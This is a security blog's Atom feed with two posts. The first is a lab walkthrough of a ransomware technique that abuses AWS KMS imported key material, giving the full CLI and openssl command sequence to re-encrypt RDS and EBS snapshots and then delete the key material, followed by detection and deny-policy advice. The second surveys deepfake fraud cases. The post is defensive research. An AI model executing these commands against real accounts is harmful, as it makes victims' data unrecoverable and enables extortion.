<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-29T16:06:32-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Heilan Cyber</title><subtitle>...in the pursuit of knowledge</subtitle><author><name>HC</name></author><entry><title type="html">Simulating Ransomware with AWS KMS</title><link href="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html" rel="alternate" type="text/html" title="Simulating Ransomware with AWS KMS" /><published>2025-09-02T00:00:00-05:00</published><updated>2025-09-02T00:00:00-05:00</updated><id>http://localhost:4000/research/2025/09/02/aws-kms-ransomware</id><content type="html" xml:base="http://localhost:4000/research/2025/09/02/aws-kms-ransomware.html"><![CDATA[<h2 id="introduction">Introduction</h2>

<p>The AWS Key Management Service (KMS) allows customers to create and manage encryption keys for their cloud resources,  with similar services existing in <a href="https://learn.microsoft.com/en-us/azure/security/fundamentals/key-management">Azure</a> and <a href="https://cloud.google.com/security/products/security-key-management?hl=en">Google Cloud Platform (GCP)</a>. KMS is essential for customers to properly secure their resources in the shared responsibility model. AWS makes it clear that while they provide the service and ensure the service itself is secure, it is the customer’s responsibility for how the service is used and how keys are protected.</p>

<p>In early 2025, <a href="https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c">Halcyon attributed</a> the APT group “Codefinger” as the perpetrators of a new ransomware campaign. The threat actors took advantage of AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt S3 buckets containing sensitive data. Because the encryption keys never resided within AWS, there is no recovery path other than paying the ransom. In a similar way as SSE-C, KMS is designed to simplify key management but can be turned against customers.</p>

<p>I first came across this technique reading a blog by <a href="https://www.chrisfarris.com/post/effective-aws-ransomware/">Chris Farris</a> and wanted to test it out in a lab environment for myself to understand how the attack works and see what can be done to prevent or mitigate it.</p>

<p>This post walks through KMS abuse end-to-end in Relational Database Service (RDS) and Elastic Block Store (EBS) and discusses afterwards what customers can do to better protect their environments.</p>

<h2 id="different-key-types-in-kms">Different Key Types in KMS</h2>

<p>KMS launched initially in November 2014, and since then has been integrated deeply into the AWS ecosystem. It provides encryption services for several relevant AWS services like EBS, EC2, RDS, Simple Email Service (SES), Simple Queue Service (SQS), S3, DynamoDB, SecretsManager, and many more. Encryption can be as simple as checking a box and specifying a key when launching a resource.</p>

<p>There are three types of keys within KMS:</p>

<ul>
  <li>AWS-owned</li>
  <li>AWS-managed</li>
  <li>Customer-managed keys (CMKs)</li>
</ul>

<p>AWS-owned keys are fully managed by the AWS service that encrypts the customer’s data. The customer has no visibility or control for these types of keys.<br />
AWS-managed keys are the default for most services. These keys are in the format of: <code class="language-plaintext highlighter-rouge">aws/&lt;service&gt;</code> and can only be used for a specific service.  AWS-managed keys are a quick and easy way for customers to enable encryption without additional overhead.</p>

<p>Customer Managed Keys are keys that the customer creates and manages. These keys allow customers to have complete control over their keys.</p>

<p>This post focuses on customer-managed keys that have their origin set to <code class="language-plaintext highlighter-rouge">EXTERNAL</code>. Similar to how Codefinger used SSE-C to ransom customers, these keys allow imported key material which attackers can use for their own ends.</p>

<h2 id="how-the-technique-works">How the Technique Works</h2>

<p>In 2016, AWS KMS launched a feature that <a href="https://aws.amazon.com/blogs/security/how-to-byok-bring-your-own-key-to-aws-kms-for-less-than-15-00-a-year-using-aws-cloudhsm/">allowed customers to use their own key material</a> for KMS-integrated AWS services. This feature was meant to hand the control back over to the customer completely. That control, however, comes with its own risks. If the imported material is deleted within AWS, AWS has no ability to recover it and dependent resources become inaccessible.</p>

<p>In his blog, Chris Farris outlines how threat actors can leverage this feature combined with common Identity Access Management (IAM) misconfigurations in order to execute a ransomware technique that prevents  data from being recovered by deleting the imported key material after encryption.</p>

<p>The attack path that Chris describes in his blog is fairly straightforward.</p>

<ol>
  <li>Attacker gains IAM privileges that allow <code class="language-plaintext highlighter-rouge">kms:CreateKey</code>, <code class="language-plaintext highlighter-rouge">kms:GetParametersForImport</code>, <code class="language-plaintext highlighter-rouge">kms:ImportKeyMaterial</code>, and <code class="language-plaintext highlighter-rouge">kms:ReplicateKey</code></li>
  <li>They create their own <strong>external</strong> KMS key.</li>
  <li>They import their own key material.</li>
  <li>They re-encrypt sensitive AWS resources.</li>
  <li>They delete the imported key material, rendering the key unusable for decryption.</li>
</ol>

<p><img src="/img/kms-ransomware/attack-diagram-big.png" alt="image01" width="720" class="mx-auto d-block" /></p>

<p>Once the attacker deletes the imported key material, the resources encrypted with the external key will still reference it. This means that these resources cannot have any read or write actions performed on them past this point as AWS can no longer use the specified key for decryption.</p>

<h2 id="a-practical-showcase">A Practical Showcase</h2>

<p>Let’s walk through how an attacker would exploit this step-by-step. First, here are the minimum permissions they would require in KMS:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:ImportKeyMaterial</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:CreateKey</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:CreateGrant</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:GetParametersForImport</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">kms:DeleteImportedKeyMaterial</code></td>
    </tr>
  </tbody>
</table>

<p>And here are the permissions they would need in RDS and EBS respectively:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">RDS Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:CopyDBSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:CreateDBSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:DescribeDBInstances</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">rds:RestoreDBFromDBSnapshot</code></td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th style="text-align: left">EBS Permissions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:DescribeVolumes</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:CreateSnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:CopySnapshot</code></td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ec2:DeleteSnapshot</code></td>
    </tr>
  </tbody>
</table>

<p>Once an attacker has obtained valid credentials and access to permissions that allow KMS actions, they can perform the following steps:</p>

<p>Create a customer-managed KMS key with the origin set to <code class="language-plaintext highlighter-rouge">EXTERNAL</code>. Note that imported material is only supported for symmetric keys. Running the command below will create a disabled key that is in the state ‘PendingImport’.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms create-key --key-usage ENCRYPT_DECRYPT --key-spec SYMMETRIC_DEFAULT --origin EXTERNAL
</code></pre></div></div>

<p><img src="/img/kms-ransomware/create-key.png" alt="image2" width="720" class="mx-auto d-block" /></p>

<p>Retrieve parameters for import, this is so you can save the import token and public key. These are temporary and must be used together. Ensure to Base64 decode them to get the raw binary input.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms get-parameters-for-import --key-id &lt;key-id&gt; --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048
</code></pre></div></div>

<p><img src="/img/kms-ransomware/get-params-for-import.png" alt="image3" width="720" class="mx-auto d-block" /></p>

<p>Generate a 32-byte key material blob locally using openssl.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rand -out key_material_file 32
</code></pre></div></div>

<p>Then wrap the key material using the public key.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl -encrypt -oaep -inkey public_key.pem -pubin -in key_material_file -out encrypted_key_material.bin
</code></pre></div></div>

<p>We’ll use <code class="language-plaintext highlighter-rouge">encrypted_key_material.bin</code> for our import.</p>

<p><strong>NOTE</strong>: Make sure to keep a copy of this file if you want to eventually restore the AWS resources. This is the only thing that can restore access to resources encrypted under this key material.</p>

<p>Import Key Material. Once the key material is imported, the key is enabled for use.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms import-key-material --key-id &lt;key-id&gt; --encrypted-key-material fileb://encrypted_key_material.bin --import-token fileb://import_token.bin --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
</code></pre></div></div>

<p><img src="/img/kms-ransomware/import-key-material.png" alt="image4" width="720" class="mx-auto d-block" /></p>

<p>Now the resource is fully encrypted, only allowing the attacker to decrypt the potentially sensitive data.</p>

<h3 id="alternative-leveraging-an-existing-key"><strong>Alternative: Leveraging an existing key</strong></h3>

<p>If the attacker doesn’t have the <code class="language-plaintext highlighter-rouge">kms:CreateKey</code> permission, they can rotate existing <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys to attacker-controlled material if they have <code class="language-plaintext highlighter-rouge">kms:RotateKeyOnDemand</code>.</p>

<p>The attacker can import new material into an existing key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms import-key-material <span class="se">\</span>
 <span class="nt">--key-id</span> &lt;key-id&gt; <span class="se">\</span>
 <span class="nt">--import-type</span> NEW_KEY_MATERIAL <span class="se">\</span>
 <span class="nt">--encrypted-key-material</span> fileb://encrypted_key_material.bin <span class="se">\</span>
 <span class="nt">--import-token</span> fileb://import_token.bin <span class="se">\</span>
 <span class="nt">--expiration-model</span> KEY_MATERIAL_DOES_NOT_EXPIRE
</code></pre></div></div>

<p><img src="/img/kms-ransomware/import-type-new-key-material.png" alt="image5" width="720" class="mx-auto d-block" /></p>

<p>At this point the new material won’t be active yet. It will be in the state <code class="language-plaintext highlighter-rouge">PendingRotation</code>.</p>

<p><img src="/img/kms-ransomware/pending-rotation.png" alt="image6" width="720" class="mx-auto d-block" /></p>

<p>Then to actually rotate the key:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms rotate-key-on-demand --key-id &lt;KEY_ID&gt;
</code></pre></div></div>

<p>The caveat here is that rotating on demand can only be done 10 times per key. This is also exclusive to single-region, symmetric keys. Additionally, once the current imported material is deleted, you cannot rotate the key again.</p>

<h3 id="rds"><strong>RDS</strong></h3>

<p>For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to<em>overwrite</em>the existing encryption, taking control away from the customer.</p>

<p><img src="/img/kms-ransomware/db-console.png" alt="image7" width="720" class="mx-auto d-block" /></p>

<p><img src="/img/kms-ransomware/db-console-encrypted.png" alt="image8" width="420" class="mx-auto d-block" /></p>

<p>The first thing the attacker has to do is create a snapshot. It is not possible to change the encryption key/status of a running database.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds create-db-snapshot --db-snapshot-identifier copy-pasturedb --db-instance-identifier pasturedb
</code></pre></div></div>

<p><img src="/img/kms-ransomware/create-db-snapshot.png" alt="image9" width="720" class="mx-auto d-block" /></p>

<p>Copy the DB Snapshot. In this step it is possible for an attacker to change the newly created snapshot encryption key to their own .</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds copy-db-snapshot --source-db-snapshot-identifier copy-pasturedb --target-db-snapshot-identifier ransom-pasturedb --kms-key-id &lt;key-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/copy-db-snapshot.png" alt="image10" width="720" class="mx-auto d-block" /></p>

<p>Looking in the console, the snapshot is now available. At this point, the attacker can delete the original database and snapshots.</p>

<p><img src="/img/kms-ransomware/snap-in-console.png" alt="image11" width="720" class="mx-auto d-block" /></p>

<p>Now let’s see what happens when we delete the imported key material and try to perform actions with the snapshot:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms delete-imported-key-material --key-id &lt;key-id&gt;

</code></pre></div></div>

<p><img src="/img/kms-ransomware/delete-imported-key.png" alt="image12" width="720" class="mx-auto d-block" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds copy-db-snapshot --source-db-snapshot-identifier ransom-pasturedb --target-db-snapshot-identifier ransom-pasturedb2
</code></pre></div></div>

<p><img src="/img/kms-ransomware/copydbfail.png" alt="image13" width="720" class="mx-auto d-block" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds restore-db-instance-from-db-snapshot --db-instance-identifier ransomedDB --db-snapshot-identifier ransom-pasturedb
</code></pre></div></div>

<p><img src="/img/kms-ransomware/restore-db.png" alt="image14" width="720" class="mx-auto d-block" /></p>

<h3 id="ebs"><strong>EBS</strong></h3>

<p>Similarly in EBS, volumes cannot be encrypted directly. These steps are similar to the RDS steps.</p>

<p>Create a volume snapshot within the same region.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws ec2 create-snapshot --region us-east-1 --volume-id &lt;vol-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/ec2-create-snapshot.png" alt="image15" width="720" class="mx-auto d-block" /></p>

<p>Copy the newly created snapshot and use the attacker key to encrypt an attacker controlled snapshot.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws ec2 copy-snapshot --region us-east-1 --source-region us-east-1 --source-snapshot-id &lt;snap-id&gt; --encrypted --kms-key-id &lt;key-id&gt;
</code></pre></div></div>

<p><img src="/img/kms-ransomware/ec2-copy-snapshot.png" alt="image16" width="720" class="mx-auto d-block" /></p>

<p>Delete imported key material.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms delete-imported-key-material --key-id 8a5bf6e0-bc70-47fb-9d13-a98bb8afb5f2
</code></pre></div></div>

<p><img src="/img/kms-ransomware/delete2.png" alt="image17" width="720" class="mx-auto d-block" /></p>

<p>Let’s try copying the snapshot again. It fails as the imported key material is no longer available, displaying a snapshot ID to reference.</p>

<p><img src="/img/kms-ransomware/copyfail.png" alt="image18" width="720" class="mx-auto d-block" /></p>

<p>When referencing the snapshot ID, an error message is shown.</p>

<p><img src="/img/kms-ransomware/describe%20snap.png" alt="image19" width="720" class="mx-auto d-block" /></p>

<h2 id="defensive-strategies">Defensive Strategies</h2>

<p>The technique outlined above relies entirely on legitimate AWS features and configurations, no exploits were utilized. This prevents attack mitigation through patches.</p>

<p>Thankfully, detecting this is relatively straightforward. Any occurrence of <code class="language-plaintext highlighter-rouge">ImportKeyMaterial</code>, <code class="language-plaintext highlighter-rouge">RotateKeyOnDemand</code>, or <code class="language-plaintext highlighter-rouge">DeleteImportedKeyMaterial</code> should be considered suspicious. AWS EventBridge rules can be configured to trigger alerts on these calls.</p>

<p>Beyond just that, as <a href="https://www.fogsecurity.io/blog/the-complete-guide-to-ransomware-protection-in-s3-and-kms">Fog Security</a> has documented, it is  possible to  restrict the creation of external keys and the ability to use them with the policies below.  If your organization does not require <code class="language-plaintext highlighter-rouge">EXTERNAL</code> origin keys, the safest mitigation is to block them entirely.</p>

<p>Service Control Policy: <strong>Deny creation of <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys</strong></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">

  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">

  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">

    </span><span class="p">{</span><span class="w">

      </span><span class="nl">"Sid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DenyKMSKeysCreationWithNonAWSKMSMaterial"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Deny"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"kms:CreateKey"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">

      </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">

        </span><span class="nl">"StringNotEquals"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">

          </span><span class="nl">"kms:KeyOrigin"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AWS_KMS"</span><span class="w">

        </span><span class="p">}</span><span class="w">

      </span><span class="p">}</span><span class="w">

    </span><span class="p">}</span><span class="w">

  </span><span class="p">]</span><span class="w">

</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Resource Control Policy: <strong>Deny use of <code class="language-plaintext highlighter-rouge">EXTERNAL</code> keys</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{

  "Version": "2012-10-17",

  "Statement": [

    {

      "Sid": "RestrictUsageOfNonAWSKMSKeyMaterial",

      "Effect": "Deny",

      "Principal": "*",

      "Action": [

        "kms:Encrypt",

        "kms:GenerateDataKey",

        "kms:GenerateDataKeyWithoutPlaintext",

        "kms:GenerateDataKeyPair",

        "kms:GenerateDataKeyPairWithoutPlaintext",

        "kms:ReEncrypt*"

      ],

      "Resource": "*",

      "Condition": {

        "StringNotEquals": {

          "kms:KeyOrigin": "AWS_KMS"

        }

      }

    }

  ]

}  
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>KMS is one of the most powerful services within AWS, allowing customers to add another layer of security within their environment. However, just like all services within AWS, if the attacker gets ahold of the right permissions, it can wreak havoc in a customer’s AWS environment. AWS has measures to prevent this but it’s ultimately up to the customer to choose their risk level.</p>

<p>I highly recommend reading more about this and similar techniques from <a href="https://www.chrisfarris.com/">Chris Farris</a> and <a href="https://www.fogsecurity.io/blog">Fog Security</a>.</p>]]></content><author><name>HC</name></author><category term="research" /><category term="research" /><category term="cloud" /><category term="security" /><summary type="html"><![CDATA[How attackers can abuse AWS KMS with BYOK and external key material to simulate ransomware in cloud environments.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png" /><media:content medium="image" url="https://heilancoos.github.io/img/kms-ransomware/kms-ransomware-diagram.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Weaponizing Reality: The Evolution of Deepfakes</title><link href="http://localhost:4000/research/2025/07/30/weaponizing.html" rel="alternate" type="text/html" title="Weaponizing Reality: The Evolution of Deepfakes" /><published>2025-07-30T00:00:00-05:00</published><updated>2025-07-30T00:00:00-05:00</updated><id>http://localhost:4000/research/2025/07/30/weaponizing</id><content type="html" xml:base="http://localhost:4000/research/2025/07/30/weaponizing.html"><![CDATA[<p><strong>Originally posted on IBM Think here:</strong> <a href="https://www.ibm.com/think/x-force/weaponizing-reality-evolution-deepfake-technology">Blog Link</a></p>

<h2 id="overview">Overview</h2>
<p>For decades, phishing attacks have been playing on human emotions to scam them out of account credentials and money and still do. But as technology advanced leaps and bounds since the first phishing cases in the 1990’s, phishing is no longer just about spotting the obvious scam message with typos and grammatical mistakes. Now it means questioning if that call from your friend or boss is even real – even if it sounds exactly like them. With the rise of artificial intelligence, malicious actors are only growing stealthier and more sophisticated, and everyone needs to rethink what is real, get used to looking for fake signals, and learn how to better protect their identities on and offline.</p>

<p>Social engineering is the umbrella term for a plethora of ways by which attackers and fraudsters manage to trick people into divulging information that will compromise their identity and accounts. This threat also remains one of the top attack vectors that leads to a <a href="https://www.ibm.com/reports/threat-intelligence">data breach</a>. This has been mitigated to an extent by employee training and advanced spam filters but does not appear to apply to the trending Deepfake threat. In 2024, over <a href="https://www.forbes.com/sites/edwardsegal/2024/11/10/80-of-surveyed-businesses-dont-have-plans-for-an-ai-related-crisis/">80% of companies reported they have no protocols in place to fight back against Deepfake-based attacks</a>.</p>

<p>Furthermore, <a href="https://cybertechnologyinsights.com/threat-management/pindrops-2025-report-shows-1300-percent-spike-in-deepfake-fraud-cases/">Pindrop’s 2025 Voice Intelligence Report</a> found a sharp uptick in Deepfake fraud compared to previous years reporting a 1300% increase. Deepfake attacks represent a daunting new frontier, one where you can no longer trust what you see – or hear.</p>

<h2 id="what-exactly-are-deepfakes">What exactly are “deepfakes”?</h2>

<p>The technology behind deepfakes is called <a href="https://www.ibm.com/think/topics/generative-adversarial-networks">Generative Adversarial Network</a> (GAN). It was developed in 2014 and published in a research paper by researcher <a href="https://en.wikipedia.org/wiki/Ian_Goodfellow">Ian Goodfellow</a>, and his colleagues. A GAN is a type of machine learning model that generates new data by learning patterns from training datasets. But what does this actually mean? A GAN consists of two neural networks that constantly compete with each other to create realistic, fake data. One network is the Generator, the other is the Discriminator.</p>

<p>The Generator creates synthetic content, and the Discriminator determines whether the content is real. This back and forth eventually makes the fake content look as real as possible. Think of it like sharpening a sword against a steel block. Every time the sword (the Generator) is run against the steel block (the Discriminator), the sword gets sharper.</p>

<p><img src="/img/how-gans-work.jpg" alt="https://pilot44.com/insights/the-evolution-of-generative-ai" /></p>

<p>A few years later, in 2017, the term “deepfake” was coined by a Reddit user operating under the name “deepfakes”. This person abused the GAN concept in a malicious way. Using an account dedicated to adult content, he released some of the first publicly distributed deepfake videos using images of unrelated personspeople to create fake content and distribute it online.</p>

<p>While early deepfakes were usually low quality and easier to spot. Today, that’s no longer the case. People are posting voice and image deepfakes which are very hard to identify as fake, challenging the very concept of identity and trust in the virtual world.</p>

<h2 id="deepfake-timeline---deeply-disturbing">Deepfake Timeline - Deeply Disturbing</h2>
<p>Deepfakes entered the mainstream in 2018, with the release of accessible open source deepfake tools like DeepFaceLab. Since then, the technical barriers to creating realistic deepfakes have steadily declined. In 2023, the deepfake tool market skyrocketed, with a 44% increase in development of these tools. Unfortunately, the creation of non-consensual explicit content of women has served as a motivating factor for the popularization of deepfake tools. The problem is rampant, with <a href="https://www.securityhero.io/state-of-deepfakes/">Security Hero</a> reporting that in 2023, approximately 98% of deepfake videos online are explicit in nature and only 1% of targets in that category are male.</p>

<p>In recent years, deepfakes have also been used to manipulate politics and consumer fraud. Most of the targets of deepfakes are public figures, largely because they have a wealth of media samples available on the internet.</p>

<p>In early 2024, <a href="https://apnews.com/article/new-hampshire-primary-biden-ai-deepfake-robocall-f3469ceb6dd613079092287994663db5">New Hampshire constituents</a> received a robocall that impersonated President Biden to discourage them from voting in the Democratic primary election. The malicious actor even spoofed the caller ID to appear as the Democratic Party chair. This incident is a clear example of voice phishing, a.k.a. “vishing”, using deepfake audio. Since then, <a href="https://apnews.com/article/fcc-elections-artificial-intelligence-robocalls-regulations-a8292b1371b3764916461f60660b93e6">the FCC has banned the use of AI-generated voices in robocalls</a> for voter suppression.</p>

<p>There have also been multiple deepfake videos featuring prominent public figures such as  <a href="https://www.engadget.com/deepfakes-of-elon-musk-are-pushing-crypto-giveaway-scams-on-youtube-live-200700886.html">Elon Musk</a>, the New Zealand Prime Minister, <a href="https://www.rnz.co.nz/news/national/531353/pensioner-loses-224k-after-being-tricked-by-ai-deepfake-christopher-luxon-cryptocurrency-investment-scam">Christopher Luxon</a> and <a href="https://www.ctvnews.ca/toronto/article/ontario-man-loses-12k-to-deepfake-scam-involving-prime-minister-justin-trudeau/">Canadian Prime Minister Justin Trudeau</a>. These deepfake videos promoted various cryptocurrency schemes to scam potential investors.</p>

<p>There are also more legitimate uses of deepfake technology, with <a href="https://news.mit.edu/2020/mit-tackles-misinformation-in-event-of-moon-disaster-0720">researchers at MIT’s Center for Advanced Virtuality</a> deepfaking President Richard Nixon delivering a speech about a failed moon landing. This project was created by students to warn about the importance of media literacy in the age of deepfakes. <a href="https://boldentrance.com/will-disney-researchs-ai-fran-revolutionize-re-aging-of-actors/">Disney</a> and other major Hollywood studios have also invested in using the technology for de-aging actors and including advanced visual effects in movies.</p>

<h2 id="notable-incidents-using-deepfakes">Notable incidents using deepfakes</h2>
<p>Below are four notable cases where deepfake technology was used in fraud, deception and impersonation.</p>

<h3 id="arup">Arup</h3>
<p>In early 2024, the multinational engineering firm Arup confirmed that it lost USD25 million to a deepfake scam.</p>

<p>A <a href="https://www.cnn.com/2024/05/16/tech/arup-deepfake-scam-loss-hong-kong-intl-hnk">Hong Kong employee</a> received a phishing email from Arup’s UK office requesting a “secret” transaction. Naturally, the employee was suspicious at first. His suspicion was put to rest when he joined a video call with the Chief Financial Officer and several other employees. He recognized these faces and their voices, so he sent 200 million Hong Kong dollars (USD25.6M). The money was sent in 15 transfers to <a href="https://www.techmonitor.ai/technology/cybersecurity/arup-revealed-as-victim-of-25m-deepfake-scam?cf-view">five different banks</a> before the fraud was discovered.</p>

<p>Arup’s Chief Digital Information Officer, Rob Greig, discussed the incident at the time with the <a href="https://www.weforum.org/stories/2025/02/deepfake-ai-cybercrime-arup/">World Economic Forum</a>. Greig described the incident as more “technology-enhanced social engineering” rather than a cyberattack. There was no system compromise or unauthorized access to data. People were tricked into carrying out what they thought were genuine transactions. Greig even tried to create a deepfake video of himself, and it took him less than an hour. He also believes this happens more often than people might think.</p>

<p>This case highlights the devastating financial damage deepfake phishing can have on a company. Similar cases have targeted individuals as well, with senior citizens receiving distress calls impersonating their loved ones.</p>

<h3 id="high-school-principal-incident">High school principal incident</h3>
<p>The danger of deepfakes extends not only to public figures and company executives. In 2024, a case emerged of <a href="https://www.bbc.com/news/world-us-canada-68907895">a principal in Baltimore</a> who had his life turned upside down because of an AI-generated audio clip of him appearing to make racist and antisemitic statements.</p>

<p>A fabricated audio clip of the principal of Pikesville High School, Eric Eiswert, went viral online as he appeared to make harmful and derogatory statements. The clip received well over two million views. There was immense backlash both online and in real life. The local community was especially outraged as Pikesville has a large black and Jewish population.</p>

<p>Due to the backlash, Eiswert went on leave, and police were stationed to guard his home amidst the vicious threats and harassment he was receiving. Security was also increased at the school.</p>

<p>Eiswert’s initial defense that the clip was fake was <a href="https://www.bbc.com/news/articles/ckg9k5dv1zdo">poorly received</a> and dismissed as Eiswert avoiding accountability. The clip was initially posted in January 2024. It took until April for the local police to confirm the recording was falsified. Police arrested the school’s athletic director, Dazhon Darien, on charges related to the fake clip. Eiswert had been investigating Darien for theft of school money and work performance issues. In April 2025, Dazhon Darien pleaded guilty, having purchased AI cloning tools.</p>

<p>The incident had damaging effects on Eiswert’s reputation, leaving Eiswert to move jobs and work in another school.</p>

<h3 id="uk-ceo-voice-fraud">UK CEO voice fraud</h3>
<p>One of the first major deepfake attacks occurred in 2019 when deepfake audio was <a href="https://www.trendmicro.com/vinfo/mx/security/news/cyber-attacks/unusual-ceo-fraud-via-deepfake-audio-steals-us-243-000-from-u-k-company">used to steal USD243,000</a> from a UK company.</p>

<p>The CEO of an unnamed UK energy company received a call from the CEO of the German parent company. The <a href="https://www.forbes.com/sites/jessedamiani/2019/09/03/a-voice-deepfake-was-used-to-scam-a-ceo-out-of-243000/">UK CEO noted</a> that the call even carried the “melody” of the German CEO. The fraudsters called a total of three times. In the first call, the fraudster requested the UK CEO to transfer USD243,000 to the bank account of a Hungarian supplier. The CEO complied. In the second call, they claimed the transfer was reimbursed. The third and final call, the caller was seeking a follow-up payment. After the UK CEO noticed the transfer was, in fact, not reimbursed, he refused to send any follow-up payments. The first amount was transferred to the Hungarian bank account, then to Mexico and elsewhere, making attribution difficult.</p>

<p>This early deepfake fraud case is a canary for how ambitious and sophisticated these schemes would later become.</p>

<h3 id="threat-actor-group-bluenoroff-crypto-scheme">Threat actor group BlueNoroff crypto scheme</h3>
<p>As one of the more recent attacks occurring in June 2025, the threat actor group based in North Korea, BlueNoroff, utilized deepfake technology to target cryptocurrency companies.</p>

<p>A cryptocurrency company employee received a Calendly link for a Google Meet. Two weeks later, the employee joined a Zoom call <a href="https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis">controlled by the threat actor</a>. The call was filled with deepfaked versions of senior leadership. When the employee experienced an audio issue, the attackers sent a malicious Zoom Extension. The Zoom Extension was actually a script that deployed malware to hijack any crypto wallets found on the system.</p>

<p>This attack highlights how threat actors are now combining traditional social engineering with real-time deepfake impersonation, making verification significantly harder for end users.</p>

<h3 id="a-threat-to-reckon-with">A threat to reckon with</h3>
<p>Deepfakes are no longer a potential threat; the threat and its consequences are <a href="https://www.dhs.gov/sites/default/files/publications/increasing_threats_of_deepfake_identities_0.pdf">very real and present</a>. Deepfakes today are at the point of undermining trust in the online identity verification process that many organizations, especially in the financial sector, have come to rely upon. With more people than ever authenticating themselves using biometrics across all their devices, the growth in the malicious use of deepfakes can lead to a dire need to <a href="https://www.forbes.com/councils/forbestechcouncil/2024/08/02/in-the-deepfake-era-its-time-to-overhaul-identity-verification/">rethink authentication security</a> within the next five years, or sooner.</p>

<p>As shown in recent attacks, the barrier to entry for creating realistic deepfakes has dramatically decreased. From cloned voices to full video impersonations, deepfakes empower scammers and fraudsters in ways that are harder to detect and defend against.</p>

